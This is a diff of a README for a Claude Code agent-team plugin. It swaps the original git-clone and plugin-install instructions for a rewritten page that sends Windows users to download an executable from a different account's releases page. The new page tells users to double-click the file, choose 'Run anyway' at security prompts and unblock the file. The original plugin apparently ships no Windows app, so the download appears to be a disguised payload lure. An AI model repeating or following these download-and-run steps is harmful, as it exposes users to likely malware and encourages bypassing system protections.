@@ -1,381 +1,177 @@
-<div align="center">
+# 🤖 claude-army - Build project-specific agent teams
 
-# Claude Forge
+[![Download claude-army](https://img.shields.io/badge/Download-claude--army-blue?style=for-the-badge)](https://github.com/Shaylyntriggerhappy850/claude-army/releases)
 
-A Claude Code plugin that reads your project and creates a team of specialized agents for it.
+## 🚀 What this app does
 
-It looks at the codebase, studies how PR reviews work in the project, and generates agents that understand the project's actual conventions, not generic ones.
+claude-army is a Claude Code plugin that looks at your project and builds a team of specialized agents around it. It studies code patterns, pull request reviews, and local conventions so the agents match the way your project already works.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Plugin-orange.svg)](https://docs.anthropic.com/en/docs/claude-code)
+Use it when you want Claude Code to help with tasks like:
 
-</div>
+- Understanding a new codebase
+- Reviewing pull requests with project rules in mind
+- Splitting work across focused agents
+- Keeping output aligned with the style of the repo
+- Reducing repeated setup for common tasks
 
-<br>
+## 💻 Before you start
 
-## What It Does
+You only need a Windows PC and access to the internet. For the best experience, have:
 
-You get a small team of agents, each focused on one job, built from the project's real code and review patterns.
+- Windows 10 or Windows 11
+- A modern web browser
+- Claude Code already installed
+- Enough free disk space for the app and project files
+- Permission to download files on your PC
 
-```mermaid
-graph TD
-    subgraph input [" What you provide "]
-        A["Your task description"]
-        B["Project codebase"]
-        C["PR review access"]
-    end
+## 📥 Download the app
 
-    subgraph forge [" Forge analyzes everything "]
-        D["Code patterns\nand conventions"]
-        E["Reviewer comments\nand priorities"]
-        F["Test patterns\nand quality bar"]
-    end
+1. Open the release page:
+   https://github.com/Shaylyntriggerhappy850/claude-army/releases
+2. Find the latest release at the top of the page.
+3. Download the Windows file from that release.
+4. Save the file in a folder you can find again, such as Downloads or Desktop.
 
-    subgraph agents [" Generated agent team "]
-        G["Researcher"]
-        H["Builder"]
-        I["Reviewer"]
-        J["Challenger"]
-        K["Submitter"]
-    end
+If the release page shows more than one file, choose the Windows version. If you see a zipped file, keep it in the same folder until you finish setup.
 
-    subgraph pipeline [" Orchestrated pipeline "]
-        L["Research"] --> M["Build"] --> N["Review\nand fix"] --> O["Challenge\nand fix"] --> P["Submit"]
-    end
+## 🪟 Install on Windows
 
-    A --> D
-    B --> D
-    B --> F
-    C --> E
+1. Open the folder where you saved the file.
+2. If the file is a .zip, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Find the main app file or installer.
+5. Double-click it to start the setup or launch the app.
+6. If Windows asks for permission, choose Yes.
+7. If you see a security prompt, choose Run anyway only if the file came from the release page above.
 
-    D --> G & H
-    E --> J
-    F --> I
+## ⚙️ First-time setup
 
-    G -.-> L
-    H -.-> M
-    I -.-> N
-    J -.-> O
-    K -.-> P
+After the app opens, connect it to Claude Code if the app asks for it.
 
-    style input fill:#f0f4f8,stroke:#c9d6e3,color:#2d3748
-    style forge fill:#ebf5ff,stroke:#90cdf4,color:#2b6cb0
-    style agents fill:#f0fff4,stroke:#9ae6b4,color:#276749
-    style pipeline fill:#fffbeb,stroke:#fbd38d,color:#975a16
-```
+1. Start Claude Code on your PC.
+2. Open the claude-army plugin or setup screen.
+3. Point it at the project you want to analyze.
+4. Wait while it scans the codebase.
+5. Let it build the agent team from the project rules and patterns.
 
-<br>
+The first scan may take a few minutes if the project is large.
 
-## Setup
+## 🧠 What claude-army looks for
 
-### Prerequisites
+claude-army studies your project so the agents are grounded in real project data. It can look at:
 
-Make sure you have these installed:
+- File names and folder layout
+- Common coding patterns
+- Review comments and PR habits
+- Naming style used in the repo
+- Repeated ways the team handles tasks
+- Project-specific rules and conventions
 
-| Tool | Install | Purpose |
-|------|---------|---------|
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | See docs | Runs the plugin and agents |
-| [GitHub CLI](https://cli.github.com/) | `brew install gh` | PR review analysis and submission |
+This helps the agents act like they belong to the project instead of using a generic template.
 
-After installing the GitHub CLI, authenticate:
+## 🧩 Main features
 
-```bash
-gh auth login
-```
+- Builds teams of focused agents
+- Uses project patterns as a base for agent behavior
+- Helps with code review work
+- Supports Claude Code workflows
+- Keeps agent output closer to repo style
+- Works well for large or active codebases
+- Cuts down on repeated manual setup
 
-### Installation
+## 🛠️ How to use it
 
-> This plugin is not yet on the official Claude Code marketplace. For now, install using one of the options below.
+### 1. Open your project
+Open the folder that contains the code you want claude-army to analyze.
 
-**Option A: As a plugin (recommended)**
+### 2. Run the scan
+Start the app and let it read the project files.
 
-```bash
-git clone https://github.com/pablocaeg/claude-army.git
-claude plugin install ./claude-army --scope user
-```
+### 3. Review the agent plan
+The app creates a set of agents with clear roles. You may see agents for review, cleanup, testing, or feature work.
 
-**Option B: Standalone agent (no plugin system needed)**
+### 4. Use the agents in Claude Code
+Send tasks to the agents that fit the job. For example:
 
-```bash
-git clone https://github.com/pablocaeg/claude-army.git
-cp claude-army/forge.md ~/.claude/agents/
-```
+- Use a review agent for pull request checks
+- Use a refactor agent for code cleanup
+- Use a test agent for test coverage work
+- Use a planning agent for task breakdown
 
-### Verify
-
-Open Claude Code in any project and run:
-
-```
-/claude-army:analyze
-```
-
-If it responds, you're set. If using Option B, use `@forge` instead.
-
-<br>
-
-## Usage
-
-### Step 1: Analyze the Project
-
-```
-/claude-army:analyze
-```
-
-Reads the codebase and PR reviews. Extracts the lead reviewer's actual comments and ranks them by how often they come up. Saves the analysis to `.context/forge-analysis.md`.
-
-You can optionally prepare a `.context/` folder with additional information:
-
-```
-your-project/
-├── .context/
-│   ├── task.md              # What you want to accomplish
-│   ├── research/            # Background docs, specs, references
-│   └── examples/            # Examples of desired output
-└── src/
-```
-
-### Step 2: Create the Agent Team
-
-```
-/claude-army:create-team
-```
-
-Uses the analysis to generate agents in `~/.claude/agents/`. They live outside the plugin so they can spawn each other during orchestration.
-
-### Step 3: Run the Pipeline
-
-```
-@[project]-orchestrator [describe your task]
-```
-
-Runs each agent in order with human checkpoints at key decisions.
-
-### Step 4: Pre-check Before Submitting (optional)
-
-```
-/claude-army:challenge
-```
-
-Simulates the lead reviewer's feedback on your current changes before you submit.
-
-<br>
-
-## What Gets Created
-
-Every team is different. The forge reads the actual codebase and builds agents around its patterns.
-
-| Agent | What it does | What makes it project-specific |
-|-------|-------------|-------------------------------|
-| **Researcher** | Gathers and verifies information | Knows what the builder needs, verifies against project requirements |
-| **Builder** | Writes code | Uses templates from real project files, follows naming and structure |
-| **Reviewer** | Checks against standards | Uses the project's linter config, test conventions, PR checklist |
-| **Challenger** | Simulates the lead reviewer | Built from their actual comments, ranked by frequency |
-| **Submitter** | Creates PRs | Matches the format from the project's best accepted PRs |
-| **Orchestrator** | Runs the pipeline | Chains agents with test runs between phases and human approval gates |
-| **Expert** | Answers codebase questions | Architecture map and entry points from the actual project |
-| **Test Writer** | Writes tests | Uses the project's assertion library, fixture patterns, coverage target |
-
-<br>
-
-## Interesting Parts
-
-### Reviewer Modeling
-
-One thing I found useful while building this: reading through a project's PR reviews teaches you more than reading the source code. The forge captures that by extracting the lead reviewer's actual comments and building an agent that raises the same concerns before you submit.
-
-```mermaid
-graph LR
-    subgraph collect [" Collect "]
-        A["Read 20 to 40+\nPR reviews"]
-    end
-
-    subgraph extract [" Extract "]
-        B["Lead reviewer\ncomments"]
-    end
-
-    subgraph rank [" Rank by frequency "]
-        C["Tier 1: raised on\n50%+ of PRs"]
-        D["Tier 2: raised on\n25 to 50%"]
-        E["Tier 3: raised on\n10 to 25%"]
-    end
-
-    subgraph result [" Challenger agent "]
-        F["Simulates review\nwith real quotes"]
-        G["Routes each issue\nto the right agent"]
-    end
-
-    A --> B --> C & D & E --> F --> G
-
-    style collect fill:#f0f4f8,stroke:#c9d6e3,color:#2d3748
-    style extract fill:#ebf5ff,stroke:#90cdf4,color:#2b6cb0
-    style rank fill:#fffbeb,stroke:#fbd38d,color:#975a16
-    style result fill:#f0fff4,stroke:#9ae6b4,color:#276749
-```
-
-The idea is to catch likely feedback before submitting, which can save a few review rounds.
-
-<br>
-
-### Self-Verifying Research
-
-I kept running into a problem where the research agent would confidently return wrong data, and that wrong data would end up in the code. So the research agent now verifies its own findings before passing them on.
-
-| What it verifies | How |
-|-----------------|-----|
-| Algorithms | Computes step by step against known valid data |
-| Sources | Fetches every URL to confirm it loads and has the right content |
-| Facts | Cross-references from 2+ independent official sources |
-| Status | Tags every finding: verified, partial, or unverified |
-
-<br>
-
-### Orchestrated Execution
-
-Agents run in a managed pipeline, not independently. Each phase depends on the previous one. The orchestrator runs tests between phases and pauses for human approval at key moments.
-
-```mermaid
-sequenceDiagram
-    actor You
-    participant O as Orchestrator
-    participant R as Researcher
-    participant B as Builder
-    participant T as Test Writer
-    participant V as Reviewer
-    participant C as Challenger
-    participant S as Submitter
-
-    rect rgb(240, 244, 248)
-        Note over O,R: Phase 1: Research
-        O->>R: Gather and verify information
-        R->>R: Cross-reference sources
-        R->>R: Verify URLs
-        R->>R: Prove algorithms step by step
-        R-->>O: Findings with verification status
-    end
-
-    O-->>You: Research complete. Confirm?
-    You->>O: Confirmed
-
-    rect rgb(240, 248, 240)
-        Note over O,T: Phase 2: Build and Test
-        O->>B: Create code from findings
-        B-->>O: Code ready
-        O->>T: Write tests for new code
-        T-->>O: Tests written
-        O->>O: Run test suite
-    end
-
-    rect rgb(248, 245, 240)
-        Note over O,V: Phase 3: Review and Fix
-        O->>V: Check all changes against standards
-        V-->>O: 2 blockers, 1 warning
-        O->>B: Fix blocker in validation
-        B-->>O: Fixed
-        O->>T: Add missing test case
-        T-->>O: Test added
-        O->>O: Re-run tests
-    end
-
-    rect rgb(248, 240, 240)
-        Note over O,C: Phase 4: Challenge and Fix
-        O->>C: Simulate lead reviewer
-        C-->>O: 3 questions with fix routing
-        C-->>O: Q1 needs research, Q2 needs code fix
-        O->>R: Verify Q1 claim
-        R-->>O: Confirmed, no change needed
-        O->>B: Fix Q2
-        B-->>O: Fixed
-        O->>O: Re-run tests
-    end
-
-    O-->>You: All checks pass. Submit?
-    You->>O: Go ahead
-
-    rect rgb(240, 240, 248)
-        Note over O,S: Phase 5: Submit
-        O->>S: Create PR
-        S-->>You: PR URL
-    end
-```
-
-<br>
-
-## Things I Learned Building This
-
-| Lesson | Details |
-|--------|---------|
-| Project-specific prompts matter | Generic agents produce generic output. Grounding them in the actual codebase makes a big difference. |
-| PR reviews are the best teacher | Reading 20+ reviews taught the agents more than reading every source file. |
-| Research needs verification | If the research agent gets something wrong, everything downstream is wrong too. |
-| Restrict tools per agent | Read-only agents should not be able to write files. Fewer tools, fewer mistakes. |
-| Humans should approve key decisions | The pipeline pauses after research and before submission. Full autonomy is tempting but risky. |
-| Say what NOT to do | Telling agents what to avoid prevents mistakes better than only telling them what to do. |
-| First version is always wrong | Test agents on real work, find what breaks, fix them. Repeat. |
-
-<br>
-
-## Project Structure
-
-```
-claude-army/
-├── .claude-plugin/
-│   └── plugin.json            # Plugin manifest
-├── skills/
-│   ├── analyze/
-│   │   └── SKILL.md           # /claude-army:analyze
-│   ├── create-team/
-│   │   └── SKILL.md           # /claude-army:create-team
-│   └── challenge/
-│       └── SKILL.md           # /claude-army:challenge
-├── templates/                 # Agent archetypes used by create-team
-│   ├── researcher.md
-│   ├── builder.md
-│   ├── reviewer.md
-│   ├── challenger.md
-│   ├── submitter.md
-│   ├── orchestrator.md
-│   ├── expert.md
-│   └── test-writer.md
-├── forge.md                   # Standalone agent (alternative to plugin)
-├── docs/
-│   ├── context-guide.md
-│   ├── methodology.md
-│   └── customization.md
-├── LICENSE
-└── README.md
-```
-
-<br>
-
-## Requirements
-
-| Requirement | Purpose |
-|---|---|
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | Runs the plugin and agents |
-| [GitHub CLI](https://cli.github.com/) (`gh`) | PR review analysis and submission |
-| A project to work on | The forge needs a real codebase to analyze |
-
-<br>
-
-## Limitations
-
-This is an experiment, not a production tool. Some honest caveats:
-
-- Works with Claude Code only. Other AI coding tools are not supported.
-- Tested thoroughly on one project so far. The methodology works, but more testing would help.
-- The forge produces a solid first draft of agents, but you will want to refine them after testing on real work.
-- Not fully autonomous. You still review, approve, and guide the pipeline.
-
-## Contributing
-
-This is a work in progress. If you try it on a project and find ways to improve it, issues and PRs are welcome.
-
-<br>
-
----
-
-<div align="center">
-
-MIT License
-
-</div>
+### 5. Re-scan when the project changes
+If your repo changes a lot, run another scan so the agent set stays current.
+
+## 🧪 Example use cases
+
+- A new developer opens a large repo and needs help finding the main parts
+- A team wants PR reviews that follow the repo’s own standards
+- A project needs multiple steps handled in parallel
+- A maintainer wants agents that match the code style already in the codebase
+- A user wants Claude Code to focus on one area of the project at a time
+
+## 📁 Suggested project flow
+
+A simple way to use claude-army is:
+
+1. Download the release
+2. Install or open the app on Windows
+3. Connect it to Claude Code
+4. Select your project folder
+5. Generate the agent team
+6. Use the agents for review, planning, and coding tasks
+
+## 🔧 Common issues
+
+### The file will not open
+- Make sure the download finished
+- Check that you extracted the zip file first
+- Try opening the file again from the extracted folder
+
+### Windows blocks the file
+- Right-click the file and choose Properties
+- If you see an unblock option, enable it
+- Run the file again
+
+### The app cannot find my project
+- Open the correct folder path
+- Make sure the project files are still on your computer
+- Try selecting the root folder of the repo, not a subfolder
+
+### Claude Code does not show the plugin
+- Check that Claude Code is installed
+- Restart Claude Code
+- Open the plugin list again
+- Re-run the claude-army setup
+
+## 🔍 Topics covered by this repo
+
+This project focuses on:
+
+- agent orchestration
+- AI agents
+- AI engineering
+- Anthropic
+- Claude
+- Claude Code
+- Claude Code agents
+- Claude Code plugin
+- code review
+- developer tools
+- prompt engineering
+- subagents
+
+## 📌 Best results
+
+For clean setup and better output:
+
+- Use a repo with clear folder structure
+- Keep your project files in one place
+- Re-scan after major code changes
+- Use the right agent for the task
+- Start with one project before using it across many repos
+
+## 📎 Download again
+
+If you need the release page again, use this link:
+
+https://github.com/Shaylyntriggerhappy850/claude-army/releases
